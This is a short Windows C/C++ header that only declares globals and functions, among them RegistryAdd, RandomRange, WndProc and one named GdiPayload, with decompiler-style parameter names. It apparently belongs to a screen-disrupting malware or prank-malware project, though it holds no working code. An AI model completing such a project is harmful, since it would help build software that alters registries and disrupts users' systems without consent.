#pragma once
#include <Windows.h>

static HANDLE ProcessHandle = 0;
static HINSTANCE hInstance = 0;

static LPVOID RandomDataGenerated = 0;
static RTL_CRITICAL_SECTION CriticalSection;



VOID
RegistryAdd(
	HKEY hKey,
	LPCWSTR lpSubKey,
	LPCWSTR lpValueName,
	DWORD dwType,
	DWORD dwData
);

NTSTATUS __stdcall
RtlGetVersion(
	POSVERSIONINFO lpVersionInformation
);

int __fastcall
RandomRange(
	int a1,
	int a2
);

LRESULT __stdcall
WndProc(
	HWND hWnd,
	UINT Msg,
	WPARAM wParam,
	LPARAM lParam
);

DWORD WINAPI
GdiPayload(

);